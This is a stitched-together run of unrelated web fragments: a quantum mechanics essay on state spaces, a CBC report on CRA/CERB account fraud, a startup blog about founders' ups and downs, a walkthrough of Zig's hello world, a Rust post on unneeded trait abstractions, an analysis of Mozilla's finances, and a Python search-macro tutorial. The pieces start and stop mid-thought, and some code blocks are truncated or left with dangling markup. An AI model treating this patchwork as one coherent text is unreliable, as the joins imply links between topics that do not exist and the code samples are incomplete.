a state space. Admittedly, the first postulate doesn't tell us what the state space is, for any given physical system. That needs to be figured out on a case-by-case basis. Different types of atoms have different state spaces; a human being has a different (and much more complicated) state space; the universe has a more complicated state space still.</p><p>As an example, suppose you're interested in what happens when you shine light on an atom. To give a quantum mechanical description, you'd need a state space to describe atoms and the electromagnetic field (i.e., light). <em>A priori</em> it's not obvious what that state space should be. How many dimensions should the state space have? How do particular physical configurations of atoms and light correspond to states in that state space? By itself, quantum mechanics doesn't answer these questions. It merely does the subtle-but-important job of instructing you to look for answers to these questions. Fortunately, there is a theory, known as quantum electrodynamics (often shortened to QED), which describes how atoms and light interact. Among other things, QED tells us which states and state spaces to use to give quantum descriptions of atoms and light.</p><p>In a similar way, suppose we're trying to describe particles like quarks or the Higgs boson. Just as with the atoms-and-light example, quantum mechanics tells us we need figure out the right state spaces and state vectors. But it doesn't tell us what those are. In this case, the additional theory needed is the standard model of particle physics. Like QED, the standard model sits on top of basic quantum mechanics, fleshing it out, telling us things which aren't in the four postulates of quantum mechanics.</p><p>More generally, quantum mechanics alone isn't a fully specified physical theory. Rather, it's a framework to use to construct physical theories (like QED). It's helpful to think of quantum mechanics as analogous to an operating system for a computer. On its own, the operating system doesn't do all the user needs. Rather, it's a framework that accomplishes important housekeeping functions, creating a file system, a graphical display and interface, and so on. But users need another layer of application software on top of those basic functions. That application layer is analogous to physical theories like QED and the standard model. The application layer runs within the framework provided by the operating system, but isn't itself part of the operating system<span>This analogy was popularized in Scott Aaronson's book “Quantum Computing Since Democritus”; MN believes Scott first heard it in a <a href="https://www.fields.utoronto.ca/av/audio/00-01/quantum_computing/nielsen1.mp3">talk</a> MN gave at the Fields Institute in Toronto in 2001. This wouldn't warrant mention, except when MN uses the analogy, people often respond “oh yes, that's Scott Aaronson's way of thinking about quantum mechanics”. MN doesn't recall where he first heard it, or if the description is original.</span>.</p><p>In this essay, we won't get deeply into QED or the standard model or the other theories physicists have developed to describe particular physical systems. Rather, our focus is on quantum mechanics itself – the four postulates. For examples, we'll mostly draw on the quantum circuit model, which makes simple and reasonable assumptions about state spaces and state vectors. This model is already an extremely rich arena for studying quantum mechanics.

Experts say the thieves are after emergency funds meant for pandemic relief, but there are doubts about CRA's claim that people's password habits made them vulnerable.<!-- --> <!-- -->2:01</span></span></span></p>  <h2>CERB fraud not uncommon</h2>  <p>In an email sent to CBC News days before the CRA publicized the attacks, the agency said there is typically an uptick in fraudulent activity at the beginning of each CERB pay period. The most recent period started Aug.&nbsp;2.</p>  <p>The Canadian Anti-Fraud Centre has already received more than 700 reports of identity fraud connected to the federal emergency response benefit. Resolving a fraud attempt can sometimes be a lengthy process for victims that&nbsp;can see them frozen out of receiving other benefits until their accounts are restored.</p>    <p>The RCMP has confirmed that its National Division, which investigates "sensitive, high profile cases that threaten Canada's political, economic and social integrity," is actively looking into the attacks. The Office of the Privacy Commissioner of Canada is also monitoring the situation.</p>  <p>The CRA said&nbsp;it is sending letters to those affected by the incidents, explaining how to confirm their identity to regain control of their accounts. Individuals phoning the agency for help can select the "report suspected fraud or identity theft" option to fast-track&nbsp;their call.</p>  <p>Canada's cyber intelligence agency recommends that anyone affected by the breach update their passwords immediately&nbsp;and choose something they will not use for any other account.</p></span></p></div></div>]]>

Awesome stuff!</p><p>Would be cool if you've got something on how to handle the mental ups and downs of the startup game and any crises you went through :)</p></div>— edspire (@edspire2) <a href="https://twitter.com/edspire2/status/1292474343180701697?ref_src=twsrc%5Etfw">August 9, 2020</a></blockquote> </div><p>I spent most of the week how on best to capture and write about those ups and downs.</p><p>I didn’t want to write about any crisis or meltdown in particular - that’s not helpful to you. I also didn’t want to write some motivational BS like “ you gotta push through the hard times” either and call it a day.</p><h3>Ups, or when things are good</h3><p>These were the times when everything seemed to be going right and our way. </p><p>We were knocking out new app improvements and features every week, talking to more customers, and solving every problem that came our way.</p><p>Our mood would be high, and mental energy to take on any challenge at Red Bull level. The world seemed bright and on our side.</p><p>If a difficult challenge befell us, we would take it apart and find the element within it that we could influence, and get to work.</p><h3>Downs, or when things were bad</h3><p>These were the times when everything seemed to be going wrong. </p><p>We were barely shipping, if at all. We would be sad and dejected about WhatsApp API related problems, or some WhatsApp policy that affected app function. Or we would be upset about competitors who were gaming Shopify app store’s review system to gain ground on us.</p><p>Our mood would be low, and mental energy to tackle even simple challenges non-existent.</p><p>The world seemed gloomy and against us.</p><h3>Reflecting on our journey</h3><p>Off late, Sankalp and I have been reflecting on our past year quite a lot. </p><p>The purpose of reflection is two fold:</p><ol role="list"><li>Identify areas we didn’t do great at - how do we improve our thought process and decision making to avoid fucking up again</li><li>Identify things we did really well - what worked for us that we should double down upon</li></ol><p>Sankalp was telling me about this anime he's watching called <a href="https://myanimelist.net/anime/34572/Black_Clover" target="_blank">Black Clover</a>. It’s set in a magical world where the main character has zero magical abilities and is a huge underdog with everything going against him. </p><p>However, instead of wallowing in self-pity about what's wrong with him, the character focused on growing his physical strength to immensely high levels.</p><p>But that still wasn’t enough to compete with a world where everyone had magic.</p><p>One day he came across and managed to pull out the mythical anti-magic sword, which nullified everyone’s magic around it. </p><p>And suddenly, he was the strongest character in the show. Without their magic, none of the other characters were a match for the main character who had spent all his years training the one thing under his control - his formidable physical strength.</p><h3>“Preetam, what’s this got to do with entrepreneurship?”</h3><p>Ups and downs are a natural part of life, and even more so entrepreneurship where the swings can be wild, extreme, and unpredictable. Today could be a great day, your business could be on fire the next morning.</p><p>During our reflections, it became clear to us that the difference between the ups and downs weren't just about the events happening during those phases.</p><p>There would always be a bad customer, third-party API related problems, a competitor catching up or playing unfair even during the good times.</p><p>We could always be pushing app improvements, talking to customers, and solving every problem that came our way.</p><p>From our reflections Sankalp and I concluded - it's not the external events that determined our ups and downs, but our response to it...</p><h3><strong>Focus on what you can control</strong></h3><p>The "things were good" phase would be whenever we were completely focused on doing the things that are within our control, and ignoring everything else.</p><p>The "things were bad" phase would be whenever we were obsessively focused on things outside our control and brooding over them.</p><p>Over time, our minds naturally became better at handling these ups and downs. </p><p>And now that we have introspected on our past, we have a simple mantra for how to deal with the ups and downs that will come our way in the future.</p><p>It’s simple. You can adopt it too for whenever you face a problem in your life or business.</p><figure id="w-node-a440c4f6359e-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f38b1e3add6116ab7ce2dfc_focus%20on%20what%20you%20can%20control%20motivational%20quote%20poster.png" alt=""></p></figure><p>Focus on what you can control.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>Languages are often judged initially on their "<a href="https://en.wikipedia.org/wiki/%22Hello,_World!%22_program">Hello,
world!</a>" program.
How easy is it to write? To run? How easy is it to understand? It's a very
simple program, of course, one of the simplest, even... just produce a little
text, and display it, what could be simpler?</p>
<p>It's really not fair to judge a language by such a cursory impression, but it
<em>can</em> give you an idea of what a language <em>values</em> and how it works. What does
the syntax look like? Is it typed? Is it interpreted? You can usually tell a
lot at a glance.</p>
<p>For example, One of Ruby's (many) hello worlds is so simple, it's also Python!</p>
<pre><code>print(<span>'Hello world!'</span>)
</code></pre>
<p>Often, people coming from interpreted languages experience compiled, systems
languages to be more complicated right off the bat. There is the obvious added
complexity of compiling and running being separate steps, as opposed to simply
pointing an executable at some source code and seeing a result right away, but
there are often syntactical constructs to go along with that...</p>
<p>At first glance, Rust's hello world looks fairly inert, as well:</p>
<pre><code><span><span>fn</span> <span>main</span></span>() {
    <span>println!</span>(<span>"Hello World!"</span>);
}
</code></pre>
<p>But <code>println!</code> is actually a macro, what does it look like expanded?</p>
<pre><code><span>macro_rules!</span> println {
    () =&gt; ($crate::<span>print!</span>(<span>"\n"</span>));
    ($($arg:tt)*) =&gt; ({
        $crate::io::_print($crate::format_args_nl!($($arg)*));
    })
}
</code></pre>
<p>You'll notice that this <em>also</em> has a macro <em>inside of it.</em> This matches on the
second case (because there is an argument present) and calls into
<code>$crate::format_args_nl!</code> and passes the result of that to <code>$crate::io::_print</code></p>
<pre><code><span>pub</span> <span><span>fn</span> <span>_print</span></span>(args: fmt::Arguments&lt;<span>'_</span>&gt;) {
    print_to(args, &amp;LOCAL_STDOUT, stdout, <span>"stdout"</span>);
}
</code></pre>
<p>which calls into <code>print_to</code>, which looks like</p>
<pre><code><span><span>fn</span> <span>print_to</span></span>&lt;T&gt;(
    args: fmt::Arguments&lt;<span>'_</span>&gt;,
    local_s: &amp;<span>'static</span> LocalKey&lt;RefCell&lt;<span>Option</span>&lt;<span>Box</span>&lt;<span>dyn</span> Write + <span>Send</span>&gt;&gt;&gt;&gt;,
    global_s: <span><span>fn</span></span>() -&gt; T,
    label: &amp;<span>str</span>,
) <span>where</span>
    T: Write,
{
    <span>let</span> result = local_s
        .try_with(|s| {
            
            
            
            <span>let</span> prev = s.borrow_mut().take();
            <span>if</span> <span>let</span> <span>Some</span>(<span>mut</span> w) = prev {
                <span>let</span> result = w.write_fmt(args);
                *s.borrow_mut() = <span>Some</span>(w);
                <span>return</span> result;
            }
            global_s().write_fmt(args)
        })
        .unwrap_or_else(|_| global_s().write_fmt(args));

    <span>if</span> <span>let</span> <span>Err</span>(e) = result {
        <span>panic!</span>(<span>"failed printing to {}: {}"</span>, label, e);
    }
}

</code></pre>
<p>Which is, uh, well let's just say it's not exactly <em>simple</em> looking now? There
is a lot going on here!</p>
<p>To be clear, I'm not faulting Rust here at all, my point is exactly the
opposite actually, in that there is <em>always</em> necessarily more going on in a
"Hello world!" than <code>puts "la de da"</code> or similar would have you believe on its
face. Speaking of Ruby's <code>puts</code>, what <em>is</em> the code that runs <code>puts</code> in the
Ruby interpreter itself, which is written in C?</p>

<p>Hello world!</p>
<p>We all know that a languages like Ruby or Python are designed explicitly to
hide this sort of complexity from us and let us get on with the dirty business
of munging data blobs or serving web requests or solving sudokus or whatever,
and thank goodness for that, but wow that is <em>quite</em> a lot, isn't it?</p>
<hr>
<p>When people come from languages that were designed to be ergonomic to more
systems oriented languages, they're often jarred by what they perceive to be
code thatis inelegant, ugly, and verbose. To be sure, it sometimes <em>is</em> exactly
that... (although anyone who has worked with a "pretty" language in a production
codebase knows that those are not immune to these descriptors either).</p>
<p>Usually, the tradeoff is explicit: elegance and simplicity for
<em>control</em>...  specific and granular <em>control</em>, over the program that will
eventually be run.  It isn't always necessary, in fact it is almost always _un_necessary,
to have <em>that</em> much control over your program. Obviously, productivity matters,
and if your business is <em><em>insert viable business</em></em>, well it's likely that your
goals are not going to be optimally met by futzing with manual memory
management all day (<a href="https://danluu.com/sounds-easy/">at least from the macro level, in the general
sense</a>).</p>
<p>But what if you <em>do</em> need that control? Well then, <em>you need it</em>. When every
ounce of performance actually is necessary, or on embedded systems with hard
memory constraints, or when writing code for some bespoke or otherwise uncommon
processor.</p>
<p>I'm going to choose one language, Zig, and dive deep into its hello world, but
it is important to note here that my point is not primarily about Zig, it's
about how <em>all</em> languages have to contend with an enormous amount of complexity
in order to do <em>anything</em>, even the simplest of tasks like a hello world
program. Complexity that is, for the most part, hidden from us in our day to
day. So what in the hello world is <em>actually</em> going on then?</p>
<blockquote>
<p>I'll be using the most current minor release version of Zig: 0.6.0.</p>
</blockquote>
<h2>Let's take a walk</h2>
<p><a href="https://ziglang.org/">Zig</a>'s hello world looks like this, from the docs.:</p>
<pre><code><span>const</span> std = <span>@import</span>(<span>"std"</span>);

<span>pub</span> <span><span>fn</span> <span>main</span></span>() !<span>void</span> {
    <span>const</span> stdout = std.io.getStdOut().outStream();
    <span>try</span> stdout.print(<span>"Hello, {}!\n"</span>, .{<span>"world"</span>});
}
</code></pre>
<p>If you are new to zig, a quick word on this syntax before I get into the gritty
details.</p>
<pre><code><span>const</span> std = <span>@import</span>(<span>"std"</span>);
</code></pre>
<p><code>@import</code> is a <a href="https://ziglang.org/documentation/0.6.0/#Builtin-Functions"><em>compiler
builtin</em></a> function
that assigns the namespace of the file it is referencing to the <code>const</code>
variable on the left hand side.</p>
<pre><code><span>pub</span> <span><span>fn</span> <span>main</span></span>() !<span>void</span> {
  
}
</code></pre>
<p>Just like in C, <code>main</code> is a special function that marks the entry point to a
program after it has been compiled as an executable. Unlike in C, it accepts no
arguments (C's main function has a variety of vagaries that make it a bit
<a href="https://stackoverflow.com/a/4207223">unique</a>) and command line input is
available through utility functions to allow easier cross platform use.</p>
<p>It is marked <a href="https://ziglang.org/documentation/0.6.0/#Keyword-pub"><code>pub</code></a> so
that it is accessible from outside of the immediate module ('module' here
referring to nothing more than the top level scope of the current namespace...
i.e., the file), this is a necessary step since, as the program's entry point,
<code>main</code> would <em>have</em> to be accessible from outside the immediate scope.</p>
<p><code>fn</code> is the function keyword.</p>
<p><code>main()</code> is the name of the function (and where the argument list <em>would</em> be)
and <code>!void</code> is the return type. Looking a little closer at that return type:</p>
<p>In C, the return type of a function is declared <em>before</em> anything else. This
makes a certain amount of sense: it's congruent with how variables are
declared, after all, and scanning the file you can see clearly "calling this
will get you that."</p>
<p>In Zig, the return type comes after the function declaration but before the
function body. This also makes sense! It's the same in Rust and Go, and seems
to be generally a more modern approach. The reason is actually pretty simple:
doing it this way makes it possible to have a context-free grammar! C and C++
put the parser in a position where it <a href="https://stackoverflow.com/questions/14589346/is-c-context-free-or-context-sensitive">has to understand semantics to even just
<em>parse</em> the source
code.</a></p>
<p>In Zig, <code>main</code> returns <code>void</code> (well, actually, it can return a variety of
things, and if it returns void (which is just a way of saying it doesn't return
anything at all)), it's actually returning
<a href="https://github.com/jfo/zig/blob/7381aaf70e0cad92fc52b79f3aa2a0abb7c3ee04/lib/std/start.zig#L241-L244"><code>0</code></a>
as a success code, but) there is a wrinkle!  <code>void</code> is preceded by an
exclamation mark. This means: "This function is supposed to return <code>void</code>, but
it <em>could</em> fail and return an error." This is an <a href="https://ziglang.org/documentation/0.6.0/#Inferred-Error-Sets">inferred error
set</a>, and
whenever a function that <em>could</em> fail is called, the compiler will enforce that
you handle that error at the call site. More on Zig's error handling some other
time, for now it is enough to understand what the <code>!</code> in front of the return
type declaration means. I want to move on to the body of the function, let's go
line by line.</p>
<pre><code><span>const</span> stdout = std.io.getStdOut().outStream();
</code></pre>
<p>So, we can see that this is a call into a standard library function (<code>std</code>)
that returns something that we assign to <code>const stdout</code>. Standard out (stdout) and
standard error (stderr) may be familiar concepts from the shell, but what does it
mean to be referring to <code>stdout</code> here in this program? What exactly <em>is</em>
<code>stdout</code>? Whatever it is, it's being returned by the call to <code>outStream()</code>,
which is a method called on the return value of <code>std.io.getStdOut()</code>, so we
first need to know what <em>that</em> is.</p>
<p>To the source! In the Zig source tree, <code>std</code> lives in <code>lib/std/std.zig</code>, which
is a file that makes a wide variety of functionality available. It includes the line:</p>
<pre><code><span>pub</span> <span>const</span> io = <span>@import</span>(<span>"io.zig"</span>);
</code></pre>
<p>Which is referred to on the <code>std</code> variable as <code>std.io</code> (again, notice the <code>pub</code>
keyword, without which this declared constant would be inaccesible outside of
this immediate scope). Going deeper, into <code>lib/std/io.zig</code>...</p>
<pre><code><span>pub</span> <span><span>fn</span> <span>getStdOut</span></span>() File {
    <span>return</span> File{
        .handle = getStdOutHandle(),
        .capable_io_mode = .blocking,
        .intended_io_mode = default_mode,
    };
}
</code></pre>
<p>So, <code>stdout</code> is a <em>File</em> struct. Let's look at that. It is imported at the top
of <code>io.zig</code> as</p>
<pre><code><span>const</span> File = std.fs.File;
</code></pre>
<p>and lives in the source, perhaps unsurprisingly, at <code>lib/std/fs/File.zig</code>. This
struct definition is quite long, so I'll focus on what we want to look at, the
<code>outStream()</code> method.</p>
<h2>An aside: methods vs functions</h2>
<p>Zig doesn't <em>really</em> have methods, but it's useful to talk about a special
class of functions <em>as</em> methods, since the calling convention supports implicit
passing of <code>self</code> when called on a struct "instance" using dot syntax. Let me
show you what I mean.</p>
<pre><code><span>const</span> std = <span>@import</span>(<span>"std"</span>);

<span>con…</span></code></pre></div></div>

    <article>

<p>Aug 15, 2020</p>
<p>This is a hand-wavy philosophical article about programming, without quantifiable justification, but with some actionable advice and a case study.</p>
<p>Suppose that there are two types in the program, <code>Blorb</code> and <code>Gonk</code>.
Suppose also that they both can <code>blag</code>.</p>
<p>Does it make sense to add the following trait?</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>trait</span> <span>Blag</span> <span>{</span>
    <span>fn</span> <span>blag</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>);</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>I claim that it makes sense only if you have a function like</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>fn</span> <span>blagyify</span><span>&lt;</span><span>T</span><span>:</span> <span>Blag</span><span>&gt;</span><span>(</span><span>x</span><span>:</span> <span>T</span><span>)</span> <span>{</span>
    <span>...</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>That is, if some part of you program is generic over <code>T: Blag</code>.</p>
<p>If in every <code>x.blag()</code> the <code>x</code> is either <code>Blorg</code>, or <code>Gonk</code>, but never a <code>T</code> (each usage is <em>concrete</em>), you don’t need this abstraction.
“Need” is used in a literal sense here: replace a trait with two inherent methods named <code>blag</code>, and the code will be essentially the same.
Using a trait here doesn’t achieve any <a href="https://caseymuratori.com/blog_0015">semantic compression</a>.</p>
<p>Given that abstractions have costs “don’t need” can be strengthen to “probably shouldn’t”.</p>

<p>Not going for an abstraction often allows a for more specific interface.
A monad in Haskell is a thing with <code>&gt;&gt;=</code>.
Which isn’t telling much.
Languages like Rust and OCaml can’t express a general monad, but they still have concrete monads.
The <code>&gt;&gt;=</code> is called <code>and_then</code> for futures and <code>flat_map</code> for lists.
These names are <em>more specific</em> than <code>&gt;&gt;=</code> and are easier to understand.
The <code>&gt;&gt;=</code> is only required if you want to write code generic over type of monad itself, which happens rarely.</p>
<p>Another example of abstraction which is used mostly concretely are collection hierarchies.
In Java or Scala, there’s a whole type hierarchy for things which can hold other things.
Rust’s type system can’t express <code>Collection</code> trait, so we have to get by with using <code>Vec</code>, <code>HashSet</code> and <code>BTreeSet</code> directly.
And it isn’t actually a problem in practice.
Turns out, writing code which is generic over collections (and not just over iterators) is not that useful.
The "but I can change the collection type later" argument also seems overrated — often, there’s only single collection type that makes sense.
Moreover, swapping <code>HashSet</code> for <code>BTreeSet</code> is mostly just a change at the definition site, as the two happen to have almost identical interface anyway.
The only case where I miss Java collections is when I return <code>Vec&lt;T&gt;</code>, but mean a generic <em>unordered</em> collection.
In Java, the difference is captured by <code>List&lt;T&gt;</code> vs <code>Collection&lt;T&gt;</code>.
In Rust, there’s nothing built-in for this.
It is possible to define a <code>VecSet&lt;T&gt;(Vec&lt;T&gt;)</code>, but doesn’t seem worth the effort.</p>
<p>Collections also suffer from <code>&gt;&gt;=</code> problem — collapsing similar synonyms under a single name.
Java’s
<a href="https://docs.oracle.com/javase/7/docs/api/java/util/Queue.html">Queue</a>
has <code>add</code>, <code>offer</code>, <code>remove</code>, and <code>poll</code> methods, because it needs to be a collection, but also is a special kind of collection.
In C++, you have to spell <code>push_back</code> for <code>vector</code>'s push operation, so that it duck-types with <code>deque</code>'s <code>front</code> and <code>back</code>.</p>
<div>
<table>
<tbody><tr>
<td>
<i title="Note"></i>
</td>
<td>
<p>Collection hierarchy is a sufficient, but not necessary condition for mixing up method names.
Rust’s <code>BinaryHeap</code> should have had <code>BinaryHeap::pop_max</code> method.
Alas, we are stuck with <code>pop</code>, which, coupled with the fact that the heap is surprisingly and uselessly a max-heap, means many student-hours wasted on debugging misbehaving Dijkstra algorithm.</p>
</td>
</tr>
</tbody></table>
</div>
<p>Finally, the promised case study!
rust-analyzer needs to convert a bunch of internal type to types suitable for converting them into JSON message of the Language Server Protocol.
<code>ra::Completion</code> is converted into <code>lsp::Completion</code>; <code>ra::Completion</code> contains <code>ra::TextRange</code> which is converted to <code>lsp::Range</code>, etc.</p>
<p>The first implementation started with an abstraction for conversion:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>pub</span> <span>trait</span> <span>Conv</span> <span>{</span>
    <span>type</span> <span>Output</span><span>;</span>
    <span>fn</span> <span>conv</span><span>(</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Self</span><span>::</span><span>Output</span><span>;</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>This abstraction doesn’t work for all cases — sometimes the conversion requires additional context.
For example, to convert a rust-analyzer’s offset (a position of byte in the file) to an LSP position (<code>(line, column)</code> pair), a table with positions of newlines is needed.
This is easy to handle:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>pub</span> <span>trait</span> <span>ConvWith</span><span>&lt;</span><span>CTX</span><span>&gt;</span> <span>{</span>
    <span>type</span> <span>Output</span><span>;</span>
    <span>fn</span> <span>conv_with</span><span>(</span><span>self</span><span>,</span> <span>ctx</span><span>:</span> <span>CTX</span><span>)</span> <span>-&gt;</span> <span>Self</span><span>::</span><span>Output</span><span>;</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Naturally, there was an intricate web of delegating impls.
The typical one looked like this:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
</pre></td><td><pre><span>impl</span> <span>ConvWith</span><span>&lt;&amp;</span><span>LineIndex</span><span>&gt;</span> <span>for</span> <span>TextRange</span> <span>{</span>
    <span>type</span> <span>Output</span> <span>=</span> <span>Range</span><span>;</span>
    <span>fn</span> <span>conv_with</span><span>(</span>
        <span>self</span><span>,</span>
        <span>line_index</span><span>:</span> <span>&amp;</span><span>LineIndex</span><span>,</span>
    <span>)</span> <span>-&gt;</span> <span>lsp_types</span><span>::</span><span>Range</span> <span>{</span>
        <span>Range</span><span>::</span><span>new</span><span>(</span>
            <span>self</span><span>.start</span><span>()</span><span>.conv_with</span><span>(</span><span>line_index</span><span>),</span>
            <span>self</span><span>.end</span><span>()</span><span>.conv_with</span><span>(</span><span>line_index</span><span>),</span>
        <span>)</span>
    <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>There were a couple of genuinely generic impls for converting iterators of convertible things.</p>
<p>The code was hard to understand.
It also was hard to use: if calling <code>.conv</code> didn’t work immediately, it took a lot of time to find which specific impl didn’t apply.
Finally, there were many accidental (as in “accidental complexity”) changes to the shape of code: <code>CTX</code> being passed by value or by reference, switching between generic parameters and associated types, etc.</p>
<p>I was really annoyed by how this conceptually simple pure boilerplate operation got expressed as clever and fancy abstraction.
Crucially, almost all of the usages of the abstraction (besides those couple of iterator impls) were concrete.
So I replaced the whole edifice with much simpler code, a bunch of functions:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre> 1
 2
 3
 4
 5

</pre></td><td><pre><span>fn</span> <span>range</span><span>(</span>
    <span>line_index</span><span>:</span> <span>&amp;</span><span>LineIndex</span><span>,</span>
    <span>range</span><span>:</span> <span>TextRange</span><span>,</span>
<span>)</span> <span>-&gt;</span> <span>lsp_types</span><span>::</span><span>Range</span> <span>{</span>
    <span>let</span> <span>start</span> <span>=</span> <span>position</span><span>(</span><span>line_index</span><span>,</span> <span>range</span><span>.start</span><span>());</span>
    <span>let</span> <span>end</span> <span>=</span> <span>position</span><span>(</span><span>line_index</span><span>,</span> <span>range</span><span>.end</span><span>());</span>
    <span>lsp_types</span><span>::</span><span>Range</span><span>::</span><span>new</span><span>(</span><span>start</span><span>,</span> <span>end</span><span>)</span>
<span>}</span>

<span>fn</span> <span>position</span><span>(</span>
    <span>line_index</span><span>:</span> <span>&amp;</span><span>LineIndex</span><span>,</span>
    <span>offset</span><span>:</span> <span>TextSize</span><span>,</span>
<span>)</span> <span>-&gt;</span> <span>lsp_types</span><span>::</span><span>Position</span> <span>{</span>
    <span>...</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Simplicity and ease of use went up tremendously.
Now instead of typing <code>x.conv()</code> and trying to figure out why an impl I think should apply doesn’t apply, I just auto-complete <code>to_proto::range</code> and let the compiler tell me exactly which types don’t line up.</p>
<p>I’ve lost fancy iterator impls, but the
<a href="https://github.com/rust-analyzer/rust-analyzer/pull/4418/commits/1586bab0b97bef411e6187dfc389557edbc5a16e">total diff</a>
for the commit was <code>+999,-1123</code>.
There was some genuine code re-use in those impls, but it was not justified by the overall compression, even disregarding additional complexity tax.</p>
<p>To sum up, “is this abstraction used exclusively concretely?” is a meaningful question about the overall shape of code.
If the answer is “Yes!”, then the abstraction can be replaced by a number of equivalent non-abstract implementations.
As the latter tend to be simpler, shorter, and more direct, “Concrete Abstraction” can be considered a code smell.
As usual though, any abstract programming advice can be applied only in a concrete context — don’t blindly replace abstractions with concretions, check if provided justifications work for your particular case!</p>

<p>In my <a href="https://civilityandtruth.com/2020/08/13/mozillas-uncertain-future/">last post about Mozilla</a> I included a bit of data and a
lot of opinions. In this post I’ll reverse that and provide more data
and fewer opinions.</p>

<p>I was interested in knowing at a high level what were the major
categories of Mozilla’s revenue and (what’s a bit more interesting)
what were the major categories of Mozilla’s expenses. To do this I
went through the consolidated financial statements for the Mozilla
Foundation and Mozilla Corporation, extracted the data I was
interested in, and applied a bit of R code.</p>

<p>The graph above shows the major categories of revenue for Mozilla from
2005 through 2018, the last year for which we have financial
data. Note that I consolidated some categories of revenue to simplify
the graph. For example, I combined income from interest and dividends,
investment gains and losses, and similar categories into an overall
category of miscellaneous revenue.</p>

<p>The results are not surprising: by far the major driver of revenue was
royalties received from Google and other search engine vendors, with
everything else (including grants and donations to the Mozilla
Foundation) being relatively negligible.</p>

</figure>

<p>The data for the various high-level categories is bit more interesting
when expressed as a percentage of total revenue. Again, royalties from
Google and other search engine providers dominate the picture, never
going below 90% of total revenue and typically at 95% or greater.</p>

<p>There’s one interesting anomaly for the years prior to 2009, in which
miscellaneous income rose to almost 10% of total revenue and then
dropped below zero (i.e., it constituted a net loss). This appears to
be due to Mozilla Foundation and/or Corporation investments doing well
in the run-up to the financial crisis of 2008, and then suffering
losses. Since 2009 miscellaneous income has been more stable as a
percentage of total revenue, possibly due to the favorable economic
environment and/or more conservative investment strategies.</p>

<p>Also, for future reference note the category relating to subscriptions
and advertising, which is currently under 5% of total revenues. I
presume that revenues relating to Pocket are assigned to that
category, and that revenues from the Mozilla VPN and other services
will go there as well. It will be interesting to see in future
financial statements whether that category grows substantially as a
percentage of total revenue. That will be a key indicator of whether
Mozilla is going to be able to move beyond its dependence on Google and
other search engine providers.</p>

<p>The graph above shows the main categories of expenses incurred by the
Mozilla Foundation and Mozilla Corporation considered together. As one
might expect, the largest category of expenses is for activities
related to software development, including the salaries of the
software developers themselves.</p>

<p>The next two largest categories are marketing, i.e., activities
relating to promotion of Mozilla products and services, and general
and administrative, i.e., all the support activities needed to keep
Mozilla running, including the salaries of people not involved in
software development. It’s interesting to note that marketing-related
expenses seem to have leveled off somewhat in the years leading up to
2018.</p>

<p>The programs category includes things other than software development
that further the nonprofit goals of Mozilla. Mozilla Foundation grants
and fellowships go here, among others.</p>

</figure>

<p>The final graph shows the data in the previous graph expressed as a
percentage of total expenses. Here again we see the large amount of
expenses relating to software development, just above 60% in the years
leading up to 2018.</p>

<p>Marketing and general and administrative expenses have tended to be in
the range of 10% to 20%, with marketing sometimes higher than G&amp;A
and sometimes lower. Finally, program-related expenses have been
rising in the years leading up to 2018, and if this trend continues in
2019 and beyond may come to make up around 10% of total Mozilla
spending.</p>

<p>That concludes this brief tour of Mozilla’s finances. There is more
that could be said about Mozilla’s finances, but that’s a task I will
leave to others; see the section below for how to get started.</p>

<p>Finally, thanks to all who read my prior post and tweeted about it,
and to those who ended up following me on Twitter or subscribing to my
(very occasional) newsletter. If you’re interested in more of my
thoughts on Mozilla I will likely end up disappointing you: this will
probably be my final Mozilla-related post for a while, and perhaps
forever. Feel free to unfollow me or unsubscribe unless you have an
interest in whatever other topics I might end up writing about next.</p>

<p>A lot of my Google searches are specific and require lots of typing, e.g.</p>
<blockquote>
<p>site:cppreference.com OR site:cplusplus.com realloc</p>
</blockquote>
<p>This searches for "realloc" on <a href="https://en.cppreference.com/w/">cppreference.com</a> and <a href="https://www.cplusplus.com/">cplusplus.com</a>.
To reduce the amount of typing, I built a command line tool that allows me to
use <a href="https://en.wikipedia.org/wiki/Macro_(computer_science)">macros</a> that expand into larger phrases. E.g. I can write</p>
<blockquote>
<p>{cpp} realloc</p>
</blockquote>
<p>instead of writing</p>
<blockquote>
<p>site:cppreference.com OR site:cplusplus.com realloc</p>
</blockquote>
<p>In this week's post, I'll show you how I built this tool. You will learn:</p>
<ul>
<li>How to use the <a href="https://docs.python.org/3/library/pathlib.html">pathlib</a> and <a href="https://docs.python.org/3/library/re.html">re</a> modules to parse macros from a text file.</li>

</code></pre>
</li>
</ul>
<p>I could copy-and-paste these URLs into my browser. But, since I use macOS, I
create a <a href="http://zsh.sourceforge.net/Doc/Release/Functions.html#Functions">shell function</a> that uses the <a href="https://ss64.com/osx/open.html">open</a> command:</p>
<blockquote>
<pre><code>$ gg() { open "$(./search-google "$@")" ; }
$ gg {movie} alien 1979
</code></pre>
</blockquote>
<pre><code>(Opens URL in my browser.)
</code></pre>

<p>I place the macro file in my <a href="https://en.wikipedia.org/wiki/Home_directory">home directory</a> using <a href="https://docs.python.org/3/library/pathlib.html#pathlib.Path.home">pathlib.Path.home</a>.</p>
